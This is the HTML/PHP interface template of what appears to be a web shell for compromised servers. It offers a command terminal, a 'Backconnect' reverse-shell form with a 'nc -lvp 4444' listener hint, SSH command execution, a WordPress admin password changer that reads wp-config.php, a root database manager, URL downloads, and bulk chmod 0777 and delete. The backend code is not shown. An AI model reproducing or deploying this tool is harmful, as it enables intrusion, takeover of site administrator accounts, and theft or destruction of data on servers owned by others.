                    <a href="?dir=<?=urlencode($dir)?>&show_terminal=1"><button class="action-btn">💻</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_bulk=1"><button class="action-btn">🔧</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_upload=1"><button class="action-btn">📤</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_url_upload=1"><button class="action-btn feature-btn">🔗</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_wp_changer=1"><button class="action-btn feature-btn">🔑</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_backconnect=1"><button class="action-btn feature-btn">🔄</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_ssh=1"><button class="action-btn feature-btn">🔐</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_rdp=1"><button class="action-btn feature-btn">🖥️</button></a>
                    <a href="?dir=<?=urlencode($dir)?>&show_database=1"><button class="action-btn feature-btn">🗄️</button></a>
                    <a href="?logout=1"><button class="action-btn btn-danger">🚪</button></a>
                </div>
            </div>
        </div>
        
        <div class="top-row">
            <div class="card">
                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
                    <h3>📁 <?=esc(basename($dir) ?: $dir)?></h3>
                    <div class="small">Items: <?=count($files)-2?></div>
                </div>
                
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:15px;">
                    <form method="POST" style="display:flex;gap:8px">
                        <input class="input" name="new_folder" placeholder="New folder" required>
                        <button class="btn-neon" type="submit">📁</button>
                    </form>
                    <form method="POST" style="display:flex;gap:8px">
                        <input class="input" name="new_file" placeholder="New file" required>
                        <button class="btn-neon" type="submit">📄</button>
                    </form>
                </div>
                
                <div class="table-wrap">
                    <form id="bulkForm" method="POST">
                        <table>
                            <thead>
                                <tr>
                                    <th style="width:30px"><input type="checkbox" id="selectAll" class="bulk-checkbox"></th>
                                    <th>Name</th>
                                    <th>Type</th>
                                    <th>Size</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <?php if ($dir != '/' && $dir != '' && $parent != $dir): ?>
                                <tr>
                                    <td></td>
                                    <td>..</td>
                                    <td>📁 Parent</td>
                                    <td>-</td>
                                    <td>
                                        <a href="?dir=<?=urlencode($parent)?>">
                                            <button class="action-btn" type="button">Open</button>
                                        </a>
                                    </td>
                                </tr>
                                <?php endif; ?>
                                
                                <?php foreach ($files as $f): ?>
                                    <?php if ($f == '.' || $f == '..') continue; ?>
                                    <?php
                                    $p = $dir . '/' . $f;
                                    $is_dir = is_dir($p);
                                    $size = !$is_dir ? @filesize($p) : 0;
                                    ?>
                                    <tr>
                                        <td><input type="checkbox" class="bulk-checkbox" name="bulk_selected[]" value="<?=esc($f)?>"></td>
                                        <td><?=esc($f)?></td>
                                        <td><?=$is_dir?'📁 Folder':'📄 File'?></td>
                                        <td><?=!$is_dir?hfs($size):'-'?></td>
                                        <td>
                                            <?php if ($is_dir): ?>
                                                <a href="?dir=<?=urlencode($p)?>"><button class="action-btn">Open</button></a>
                                                <form method="POST" style="display:inline">
                                                    <input type="hidden" name="del_file" value="<?=esc($p)?>">
                                                    <button class="action-btn btn-danger" onclick="return confirm('Delete?')">🗑️</button>
                                                </form>
                                            <?php else: ?>
                                                <a href="<?=esc($p)?>" download><button class="action-btn">📥</button></a>
                                                <form method="POST" style="display:inline">
                                                    <input type="hidden" name="edit_file" value="<?=esc($p)?>">
                                                    <button class="action-btn">✏️</button>
                                                </form>
                                                <form method="POST" style="display:inline">
                                                    <input type="hidden" name="del_file" value="<?=esc($p)?>">
                                                    <button class="action-btn btn-danger" onclick="return confirm('Delete?')">🗑️</button>
                                                </form>
                                            <?php endif; ?>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                                
                                <?php if (count($files) <= 2): ?>
                                    <tr><td colspan="5" style="text-align:center;padding:30px;color:var(--muted)">📂 Folder is empty</td></tr>
                                <?php endif; ?>
                            </tbody>
                        </table>
                        
                        <div id="bulkActionsBar" style="display:none;margin-top:15px;padding:15px;background:rgba(0,0,0,0.1);border-radius:8px;">
                            <strong style="color:var(--neon-cyan)">🔧 Bulk Actions:</strong>
                            <div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap;">
                                <button type="button" class="action-btn" onclick="setBulkAction('delete')">🗑️ Delete</button>
                                <button type="button" class="action-btn" onclick="setBulkAction('zip')">📦 Zip</button>
                                <button type="button" class="action-btn" onclick="setBulkAction('unzip')">📂 Unzip</button>
                                <button type="button" class="action-btn" onclick="setBulkAction('copy')">📋 Copy</button>
                                <button type="button" class="action-btn" onclick="setBulkAction('move')">🚚 Move</button>
                                <button type="button" class="action-btn" onclick="setBulkAction('chmod')">🔒 Chmod</button>
                                <button type="button" class="action-btn" onclick="setBulkAction('rename')">✏️ Rename</button>
                                <button type="button" class="action-btn" onclick="setBulkAction('export_list')">📊 Export</button>
                                <span id="selectedCount" style="color:var(--neon-cyan);margin-left:auto;">0 selected</span>
                            </div>
                        </div>
                        
                        <input type="hidden" id="bulkAction" name="bulk_action" value="">
                        <input type="hidden" id="zipName" name="zip_name" value="archive_<?=date('Ymd_His')?>.zip">
                        <input type="hidden" id="bulkTarget" name="bulk_target" value="<?=esc($dir)?>">
                        <input type="hidden" id="chmodMode" name="chmod_mode" value="0644">
                        <input type="hidden" id="renamePattern" name="rename_pattern" value="">
                        <input type="hidden" id="renameType" name="rename_type" value="">
                        <input type="hidden" id="renameSearch" name="rename_search" value="">
                        <input type="hidden" id="renameReplace" name="rename_replace" value="">
                    </form>
                </div>
            </div>
        </div>
    </div>
    
    <!-- Mobile Menu -->
    <div class="mobile-menu">
        <a href="?dir=<?=urlencode($dir)?>&show_monitor=1"><button class="mobile-menu-btn">📊</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_terminal=1"><button class="mobile-menu-btn">💻</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_bulk=1"><button class="mobile-menu-btn">🔧</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_upload=1"><button class="mobile-menu-btn">📤</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_url_upload=1"><button class="mobile-menu-btn">🔗</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_wp_changer=1"><button class="mobile-menu-btn">🔑</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_backconnect=1"><button class="mobile-menu-btn">🔄</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_ssh=1"><button class="mobile-menu-btn">🔐</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_rdp=1"><button class="mobile-menu-btn">🖥️</button></a>
        <a href="?dir=<?=urlencode($dir)?>&show_database=1"><button class="mobile-menu-btn">🗄️</button></a>
        <a href="?logout=1"><button class="mobile-menu-btn" style="background:var(--danger)">🚪</button></a>
    </div>
    
    <!-- ==================== POPUP WINDOWS ==================== -->
    
    <!-- Bulk Operations Popup -->
    <?php if ($show_bulk): ?>
    <div class="popup-overlay">
        <div class="popup-content" style="max-width:600px;">
            <div class="popup-header">
                <h4>🔧 Bulk Operations</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <div style="margin-bottom:15px;padding:10px;background:rgba(109,240,255,0.05);border-radius:8px;">
                    <strong style="color:var(--neon-cyan)">Selected: <span id="popupSelectedCount">0</span> items</strong>
                    <div style="font-size:12px;color:var(--muted);margin-top:5px;">Select files from main table first</div>
                </div>
                
                <div class="feature-section">
                    <h5>📦 ZIP Operations</h5>
                    <input type="text" id="bulkZipName" class="input" placeholder="archive.zip" value="archive_<?=date('Ymd_His')?>.zip">
                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px;">
                        <button type="button" class="btn-neon" onclick="executeBulk('zip')">Create ZIP</button>
                        <button type="button" class="btn-neon" onclick="executeBulk('unzip')">Extract ZIPs</button>
                    </div>
                </div>
                
                <div class="feature-section">
                    <h5>📋 Copy/Move Files</h5>
                    <input type="text" id="bulkTargetDir" class="input" placeholder="Target directory" value="<?=esc($dir)?>">
                    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:10px;">
                        <button type="button" class="action-btn" onclick="executeBulk('copy')">Copy</button>
                        <button type="button" class="action-btn" onclick="executeBulk('move')">Move</button>
                    </div>
                </div>
                
                <div class="feature-section">
                    <h5>🔒 Change Permissions</h5>
                    <select id="bulkChmod" class="input">
                        <option value="0644">0644 - Files (rw-r--r--)</option>
                        <option value="0755">0755 - Folders (rwxr-xr-x)</option>
                        <option value="0777">0777 - Full Access</option>
                    </select>
                    <button type="button" class="btn-neon" onclick="executeBulk('chmod')">Change</button>
                </div>
                
                <div class="feature-section">
                    <h5>✏️ Batch Rename</h5>
                    <select id="renameTypeSelect" class="input" onchange="showRenameOptions()">
                        <option value="prefix">Add Prefix</option>
                        <option value="suffix">Add Suffix</option>
                        <option value="replace">Replace Text</option>
                        <option value="number">Add Numbering</option>
                    </select>
                    <div id="renameOptions" style="margin-top:10px;">
                        <input type="text" id="renameText" class="input" placeholder="Text">
                    </div>
                    <button type="button" class="btn-neon" onclick="executeBulk('rename')">Rename</button>
                </div>
                
                <div class="feature-section">
                    <h5>📊 Export List</h5>
                    <button type="button" class="action-btn" onclick="executeBulk('export_list')" style="width:100%">Export to TXT</button>
                </div>
                
                <div class="feature-section">
                    <h5>🗑️ Delete Files</h5>
                    <button type="button" class="btn-danger" onclick="executeBulk('delete')" style="width:100%">Delete Selected</button>
                </div>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- SSH Manager Popup -->
    <?php if ($show_ssh): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>🔐 SSH Manager</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <div class="feature-section">
                        <h5>SSH Connection</h5>
                        <input type="text" name="ssh_host" class="input" placeholder="Host/IP" required>
                        <input type="number" name="ssh_port" class="input" placeholder="Port" value="22">
                        <input type="text" name="ssh_user" class="input" placeholder="Username" required>
                        <input type="password" name="ssh_pass" class="input" placeholder="Password" required>
                        <input type="text" name="ssh_command" class="input" placeholder="Command (ls -la)" value="ls -la" required>
                        <button type="submit" class="btn-neon">Execute SSH Command</button>
                    </div>
                </form>
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output"><?=esc($feature_result)?></div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- WordPress Password Changer Popup -->
    <?php if ($show_wp_changer): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>🔑 WordPress Password Changer</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <div class="feature-section">
                        <h5>Scan for WordPress</h5>
                        <button type="submit" name="wp_action" value="find" class="btn-neon">Scan Current Directory</button>
                    </div>
                    
                    <div class="feature-section">
                        <h5>Change Password</h5>
                        <input type="text" name="wp_path" class="input" placeholder="/path/to/wp-config.php" required>
                        <input type="text" name="wp_user" class="input" placeholder="Username (admin)" value="admin" required>
                        <input type="text" name="wp_pass" class="input" value="<?=generatePassword()?>" required>
                        <input type="hidden" name="wp_action" value="change">
                        <button type="submit" class="btn-neon">Change Password</button>
                    </div>
                </form>
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output"><?=esc($feature_result)?></div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Backconnect Popup -->
    <?php if ($show_backconnect): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>🔄 Backconnect</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <div class="feature-section">
                        <h5>Start Backconnect</h5>
                        <input type="text" name="backconnect_host" class="input" placeholder="Your IP/Listener" required>
                        <input type="number" name="backconnect_port" class="input" placeholder="Port (4444)" value="4444" required>
                        <button type="submit" class="btn-neon">Connect</button>
                        <div style="font-size:11px;color:var(--muted);margin-top:10px;">Run listener: <code>nc -lvp 4444</code></div>
                    </div>
                </form>
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output"><?=esc($feature_result)?></div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Database Manager Popup -->
    <?php if ($show_database): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>🗄️ Database Manager</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <div class="feature-section">
                        <h5>Database Connection</h5>
                        <input type="text" name="db_host" class="input" value="localhost">
                        <input type="text" name="db_user" class="input" value="root">
                        <input type="password" name="db_pass" class="input" placeholder="Password">
                    </div>
                    
                    <div class="feature-section">
                        <h5>List Databases</h5>
                        <input type="hidden" name="db_action" value="list">
                        <button type="submit" class="btn-neon">List All Databases</button>
                    </div>
                    
                    <div class="feature-section">
                        <h5>Execute SQL</h5>
                        <input type="text" name="db_name" class="input" placeholder="Database name">
                        <textarea name="db_sql" class="input" rows="3" placeholder="SQL Query">SHOW TABLES</textarea>
                        <input type="hidden" name="db_action" value="query">
                        <button type="submit" class="btn-neon">Execute Query</button>
                    </div>
                </form>
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output"><?=esc($feature_result)?></div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- RDP Creator Popup -->
    <?php if ($show_rdp): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>🖥️ RDP Creator</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <div class="feature-section">
                        <h5>Create RDP File</h5>
                        <input type="text" name="rdp_host" class="input" placeholder="Host/IP" required>
                        <input type="text" name="rdp_user" class="input" placeholder="Username" required>
                        <input type="text" name="rdp_domain" class="input" placeholder="Domain (optional)">
                        <input type="text" name="rdp_filename" class="input" placeholder="Filename" value="connection.rdp">
                        <input type="hidden" name="rdp_action" value="create">
                        <button type="submit" class="btn-neon">Create RDP File</button>
                    </div>
                    
                    <div class="feature-section">
                        <h5>Test RDP</h5>
                        <input type="text" name="rdp_test_host" class="input" placeholder="Host/IP to test">
                        <input type="hidden" name="rdp_action" value="test">
                        <button type="submit" class="btn-neon">Test RDP Service</button>
                    </div>
                </form>
                <?php if (!empty($feature_result)): ?>
                <div class="feature-output"><?=esc($feature_result)?></div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- URL Upload Popup -->
    <?php if ($show_url_upload): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>🔗 URL Upload</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <div class="feature-section">
                        <h5>Download from URL</h5>
                        <input type="text" name="url_up_custom" class="input" placeholder="https://example.com/file.zip" required>
                        <input type="text" name="url_fn_custom" class="input" placeholder="Custom filename (optional)">
                        <button type="submit" class="btn-neon">Download</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Upload Popup -->
    <?php if ($show_upload): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>📤 File Upload</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST" enctype="multipart/form-data">
                    <input type="file" name="upload[]" class="input" multiple required>
                    <button type="submit" class="btn-neon">Upload</button>
                </form>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Terminal Popup -->
    <?php if ($show_terminal): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>💻 Terminal</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <input type="hidden" name="term_path" value="<?=esc($dir)?>">
                    <input type="text" name="term_cmd" class="input" placeholder="Enter command..." value="ls -la" required>
                    <button type="submit" class="btn-neon">Execute</button>
                </form>
                <?php if (isset($term_result)): ?>
                <div class="feature-output"><?=esc($term_result)?></div>
                <?php endif; ?>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- Server Monitor Popup -->
    <?php if ($show_monitor): ?>
    <div class="popup-overlay">
        <div class="popup-content">
            <div class="popup-header">
                <h4>📊 Server Monitor</h4>
                <a href="?dir=<?=urlencode($dir)?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <?php $monitor_result = $monitor->getStats(); ?>
                <div class="feature-section">
                    <h5>System Info</h5>
                    <div>Hostname: <?=esc($monitor_result['system']['hostname'])?></div>
                    <div>OS: <?=esc($monitor_result['system']['os'])?></div>
                    <div>PHP: <?=esc($monitor_result['system']['php_version'])?></div>
                    <div>Server: <?=esc($monitor_result['system']['server_software'])?></div>
                    <div>Time: <?=$monitor_result['system']['time']?></div>
                </div>
                
                <div class="feature-section">
                    <h5>CPU Load</h5>
                    <div>1-min: <?=$monitor_result['cpu']['load_1min']?></div>
                    <div>5-min: <?=$monitor_result['cpu']['load_5min']?></div>
                    <div>15-min: <?=$monitor_result['cpu']['load_15min']?></div>
                </div>
                
                <div class="feature-section">
                    <h5>Disk Usage</h5>
                    <div>Total: <?=$monitor_result['disk']['total']?></div>
                    <div>Used: <?=$monitor_result['disk']['used']?> (<?=$monitor_result['disk']['percent']?>)</div>
                    <div>Free: <?=$monitor_result['disk']['free']?></div>
                </div>
                
                <div class="feature-section">
                    <h5>Memory Usage</h5>
                    <?php if (isset($monitor_result['memory']['error'])): ?>
                        <div><?=$monitor_result['memory']['error']?></div>
                    <?php else: ?>
                        <div>Total: <?=$monitor_result['memory']['total']?></div>
                        <div>Used: <?=$monitor_result['memory']['used']?> (<?=$monitor_result['memory']['percent']?>)</div>
                        <div>Free: <?=$monitor_result['memory']['free']?></div>
                    <?php endif; ?>
                </div>
                
                <div class="feature-section">
                    <h5>Services Status</h5>
                    <div style="display:grid;grid-template-columns:repeat(3,1fr);gap:5px;">
                        <?php foreach ($monitor_result['services'] as $service => $status): ?>
                            <div><?=$service?>: <?=$status?></div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <?php endif; ?>
    
    <!-- File Editor Popup -->
    <?php if ($show_editor && isset($_SESSION['edit'])): ?>
    <div class="popup-overlay" style="align-items:flex-start;padding-top:40px;">
        <div class="popup-content" style="max-width:900px;max-height:85vh;">
            <div class="popup-header">
                <h4>✏️ Editing: <?=esc(basename($_SESSION['edit']['path']))?></h4>
                <a href="?dir=<?=urlencode(dirname($_SESSION['edit']['path']))?>"><button class="popup-close">×</button></a>
            </div>
            <div class="popup-body">
                <form method="POST">
                    <textarea name="edit_content" style="width:100%;height:400px;padding:15px;background:rgba(0,0,0,0.3);border:1px solid rgba(109,240,255,0.1);border-radius:8px;color:#e6eef8;font-family:monospace;font-size:13px;"><?=esc($_SESSION['edit']['data'])?></textarea>
                    <input type="hidden" name="edit_path" value="<?=esc($_SESSION['edit']['path'])?>">
                    <div style="display:flex;gap:8px;justify-content:flex-end;margin-top:15px;">
                        <button class="btn-neon" name="save_edit" type="submit">💾 Save</button>
                        <a href="?dir=<?=urlencode(dirname($_SESSION['edit']['path']))?>">
                            <button type="button" class="action-btn">← Back</button>
                        </a>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <?php unset($_SESSION['edit']); endif; ?>
    
    <script>
    // Bulk Operations Functions
    function updateBulkSelection() {
        const checkboxes = document.querySelectorAll('.bulk-checkbox:not(#selectAll)');
        const selected = Array.from(checkboxes).filter(cb => cb.checked);
        const bulkBar = document.getElementById('bulkActionsBar');
        const countSpan = document.getElementById('selectedCount');
        const popupCount = document.getElementById('popupSelectedCount');
        
        const count = selected.length;
        countSpan.textContent = count + ' selected';
        if (popupCount) popupCount.textContent = count;
        
        if (count > 0) {
            bulkBar.style.display = 'block';
            document.getElementById('selectAll').checked = count === checkboxes.length;
        } else {
            bulkBar.style.display = 'none';
        }
    }
    
    document.getElementById('selectAll').addEventListener('click', function() {
        const checkboxes = document.querySelectorAll('.bulk-checkbox:not(#selectAll)');
        checkboxes.forEach(cb => cb.checked = this.checked);
        updateBulkSelection();
    });
    
    document.querySelectorAll('.bulk-checkbox').forEach(cb => {
        cb.addEventListener('change', updateBulkSelection);
    });
    
    function setBulkAction(action) {
        const selected = document.querySelectorAll('.bulk-checkbox:not(#selectAll):checked');
        if (selected.length === 0) {
            alert('Please select files first!');
            return;
        }
        
        let proceed = true;
        let extraData = {};
        
        if (action === 'delete') {
            proceed = confirm(`Delete ${selected.length} items?`);
        }
        else if (action === 'zip') {
            const zipName = prompt('Enter ZIP filename:', 'archive_<?=date("Ymd_His")?>.zip');
            if (zipName) extraData.zip_name = zipName;
            else return;
        }
        else if (action === 'rename') {
            const renameType = prompt('Rename type (prefix/suffix/replace/number):', 'prefix');
            const renameText = prompt('Enter text/pattern:', 'new_');
            if (renameType && renameText) {
                extraData.rename_type = renameType;
                extraData.rename_pattern = renameText;
                if (renameType === 'replace') {
                    const replaceWith = prompt('Replace with:', '');
                    if (replaceWith !== null) extraData.rename_replace = replaceWith;
                }
            } else return;
        }
        else if (action === 'copy' || action === 'move') {
            const target = prompt('Enter target directory:', '<?=esc($dir)?>');
            if (target) extraData.bulk_target = target;
            else return;
        }
        else if (action === 'chmod') {
            const mode = prompt('Enter permissions (octal):', '0644');
            if (mode) extraData.chmod_mode = mode;
            else return;
        }
        
        if (!proceed) return;
        
        // Set form values
        document.getElementById('bulkAction').value = action;
        for (const [key, value] of Object.entries(extraData)) {
            const el = document.getElementById(key);
            if (el) el.value = value;
        }
        
        document.getElementById('bulkForm').submit();
    }
    
    function executeBulk(action) {
        const checkboxes = document.querySelectorAll('.bulk-checkbox:not(#selectAll):checked');
        if (checkboxes.length === 0) {
            alert('Please select files from main table first!');
            return;
        }
        
        let proceed = true;
        
        if (action === 'delete') {
            proceed = confirm(`Delete ${checkboxes.length} items?`);
        }
        else if (action === 'zip') {
            document.getElementById('zipName').value = document.getElementById('bulkZipName').value;
        }
        else if (action === 'copy' || action === 'move') {
            document.getElementById('bulkTarget').value = document.getElementById('bulkTargetDir').value;
        }
        else if (action === 'chmod') {
            document.getElementById('chmodMode').value = document.getElementById('bulkChmod').value;
        }
        else if (action === 'rename') {
            const type = document.getElementById('renameTypeSelect').value;
            const text = document.getElementById('renameText').value;
            if (!text) {
                alert('Please enter rename text!');
                return;
            }
            document.getElementById('renameType').value = type;
            document.getElementById('renamePattern').value = text;
        }
        
        if (!proceed) return;
        
        // Copy selected items to form
        const form = document.getElementById('bulkForm');
        checkboxes.forEach(cb => {
            const input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'bulk_selected[]';
            input.value = cb.value;
            form.appendChild(input);
        });
        
        document.getElementById('bulkAction').value = action;
        form.submit();
    }
    
    function showRenameOptions() {
        const type = document.getElementById('renameTypeSelect').value;
        const optionsDiv = document.getElementById('renameOptions');
        let placeholder = '';
        
        switch(type) {
            case 'prefix': placeholder = 'Prefix text (prefix_)'; break;
            case 'suffix': placeholder = 'Suffix text (_suffix)'; break;
            case 'replace': placeholder = 'Text to replace'; break;
            case 'number': placeholder = 'Starting number (1)'; break;
        }
        
        document.getElementById('renameText').placeholder = placeholder;
    }
    
    // Initialize
    document.addEventListener('DOMContentLoaded', function() {
        updateBulkSelection();
        showRenameOptions();
        
        // Notification auto-hide
        const msg = document.getElementById('msg');
        if (msg) {
            setTimeout(() => msg.style.display = 'none', 4000);
        }
        
        // Close popup on overlay click
        document.addEventListener('click', function(e) {
            if (e.target.classList.contains('popup-overlay')) {
                window.location.href = '?dir=<?=urlencode($dir)?>';
            }
        });
        
        // ESC key closes popup
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                window.location.href = '?dir=<?=urlencode($dir)?>';
            }
        });
    });
    </script>
</body>
</html>